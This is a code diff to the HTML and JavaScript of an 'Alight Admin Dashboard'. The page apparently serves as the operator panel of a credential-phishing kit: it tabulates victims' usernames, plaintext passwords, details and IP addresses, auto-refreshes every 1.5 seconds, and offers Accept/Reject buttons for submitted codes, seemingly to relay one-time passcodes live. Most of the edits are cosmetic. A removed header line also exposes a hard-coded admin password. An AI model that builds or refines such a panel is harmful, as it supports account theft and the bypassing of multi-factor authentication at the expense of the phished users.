@@ -12,17 +12,17 @@
             padding: 15px;
         }
         .container {
-            max-width: 1400px;
+            max-width: 1450px;
             margin: auto;
             background: white;
             border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            box-shadow: 0 10px 35px rgba(0,0,0,0.1);
             overflow: hidden;
         }
         .header {
             background: #1e40af;
             color: white;
-            padding: 20px;
+            padding: 25px;
             text-align: center;
         }
         table {
@@ -30,15 +30,15 @@
             border-collapse: collapse;
         }
         th, td {
-            padding: 14px;
+            padding: 15px;
             text-align: left;
             border-bottom: 1px solid #eee;
         }
         th { background: #e2e8f0; font-weight: 600; }
         tr:hover { background: #f8fafc; }
         .btn {
-            padding: 6px 12px;
-            margin: 2px;
+            padding: 7px 14px;
+            margin: 3px;
             border: none;
             border-radius: 6px;
             cursor: pointer;
@@ -47,8 +47,8 @@
         .accept { background: #22c55e; color: white; }
         .reject { background: #ef4444; color: white; }
         .refresh-btn, .clear-btn {
-            padding: 12px 20px;
-            margin: 10px;
+            padding: 12px 24px;
+            margin: 10px 5px;
             border: none;
             border-radius: 8px;
             font-weight: 600;
@@ -56,19 +56,25 @@
         }
         .refresh-btn { background: #3b82f6; color: white; }
         .clear-btn { background: #ef4444; color: white; }
-        .status { text-align: center; padding: 12px; background: #f0f9ff; color: #0369a1; }
+        .status { 
+            text-align: center; 
+            padding: 12px; 
+            background: #f0f9ff; 
+            color: #0369a1; 
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <h1>🔐 Alight Admin Dashboard</h1>
-            <p>Live Activity Monitor • Password: tunde6035</p>
+            <p>Live Monitoring • All User Activity</p>
         </div>
 
         <div class="status" id="status">Loading records...</div>
 
-        <button class="refresh-btn" onclick="forceRefresh()">🔄 Force Refresh</button>
+        <button class="refresh-btn" onclick="forceRefresh()">🔄 Force Refresh Now</button>
         <button class="clear-btn" onclick="clearRecords()">🗑️ Clear All Records</button>
 
         <table id="recordsTable">
@@ -79,7 +85,7 @@
                     <th>Username</th>
                     <th>Password</th>
                     <th>Full Details</th>
-                    <th>IP</th>
+                    <th>IP Address</th>
                     <th>Action</th>
                 </tr>
             </thead>
@@ -97,13 +103,18 @@
                 const tbody = document.querySelector('#recordsTable tbody');
                 tbody.innerHTML = "";
 
-                document.getElementById('status').textContent = `✅ ${records.length} Records • Last updated: ${new Date().toLocaleTimeString()}`;
+                document.getElementById('status').textContent = `✅ ${records.length} Records • Updated ${new Date().toLocaleTimeString()}`;
 
                 records.forEach(r => {
-                    let action = r.address && r.address.includes("Pending") 
-                        ? `<button class="btn accept" onclick="confirmCode(${r.id}, 'Confirmed')">Accept</button>
-                           <button class="btn reject" onclick="confirmCode(${r.id}, 'Rejected')">Reject</button>`
-                        : (r.address && r.address.includes("Confirmed") ? "✅ Confirmed" : "❌ Rejected");
+                    let action = '';
+                    if (r.address && r.address.includes("Pending")) {
+                        action = `
+                            <button class="btn accept" onclick="confirmCode(${r.id}, 'Confirmed')">✅ Accept</button>
+                            <button class="btn reject" onclick="confirmCode(${r.id}, 'Rejected')">❌ Reject</button>
+                        `;
+                    } else {
+                        action = r.address && r.address.includes("Confirmed") ? "✅ Confirmed" : "❌ Rejected";
+                    }
 
                     tbody.innerHTML += `
                         <tr>
@@ -111,18 +122,18 @@
                             <td>${r.type || '-'}</td>
                             <td><strong>${r.username || '-'}</strong></td>
                             <td><code>${r.password || '-'}</code></td>
-                            <td style="max-width:520px; word-break:break-all;">${r.address || '-'}</td>
+                            <td style="max-width: 520px; word-break: break-all;">${r.address || '-'}</td>
                             <td>${r.ip || 'Unknown'}</td>
                             <td>${action}</td>
                         </tr>`;
                 });
             } catch (e) {
-                document.getElementById('status').innerHTML = "❌ Connection error - Click Force Refresh";
+                document.getElementById('status').innerHTML = "❌ Error — Click Force Refresh";
             }
         }
 
         async function confirmCode(id, status) {
-            if (confirm(`Mark this as ${status}?`)) {
+            if (confirm(`Mark this record as ${status}?`)) {
                 await fetch('/api/confirm-code', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -133,7 +144,7 @@
         }
 
         async function clearRecords() {
-            if (confirm("Delete ALL records permanently?")) {
+            if (confirm("⚠️ Delete ALL records permanently?")) {
                 await fetch('/api/clear', { method: 'POST' });
                 loadRecords();
             }
@@ -144,6 +155,7 @@
             loadRecords();
         }
 
+        // Load with password protection
         window.onload = () => {
             const pass = prompt("Enter Admin Password:");
             if (pass !== ADMIN_PASSWORD) {
@@ -152,7 +164,7 @@
                 return;
             }
             loadRecords();
-            setInterval(loadRecords, 1800);   // Auto refresh every 1.8 seconds
+            setInterval(loadRecords, 1500);   // Auto refresh every 1.5 seconds
         };
     </script>
 </body>
